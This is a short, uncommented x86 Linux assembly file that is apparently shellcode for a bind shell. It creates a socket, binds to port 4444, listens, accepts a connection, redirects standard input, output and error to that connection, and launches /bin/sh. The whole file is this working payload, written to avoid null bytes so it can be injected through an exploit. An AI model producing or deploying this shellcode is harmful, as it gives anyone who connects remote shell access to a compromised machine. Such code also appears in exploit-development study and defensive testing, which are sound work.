section .text

global _start

_start:
	xor ebx,ebx
	xor eax,eax
	xor ecx,ecx
	xor esi,esi
	xor edi,edi
	xor edx,edx

	push edi
	push 0x1
	push 0x2
	mov ecx,esp

	mov al,102
	mov bl,1
	int 80h

	mov edx,eax

	push edi
	push edi
	push edi
	push word 0x5c11
	push word 2
	mov ecx,esp

	push 16
	push ecx
	push edx
	mov ecx,esp
	mov al,102
	mov bl,2
	int 80h

	push edi
	push edx
	mov ecx,esp
	mov al,102
	mov bl,4
	int 80h

	push edi
	push edi
	push edx
	mov ecx,esp
	mov al,102
	mov bl,5
	int 80h

	mov ebx,eax
	xor eax,eax
	xor ecx,ecx
	mov cl,2

dup2:
	mov al,63
;	mov ebx,esi
	int 80h

	dec ecx
	jns dup2

	inc ecx
	push ecx
	push 0x68732f6e
	push 0x69622f2f
	mov ebx,esp
	xor edx,edx
	mov al,0xb
	int 80h
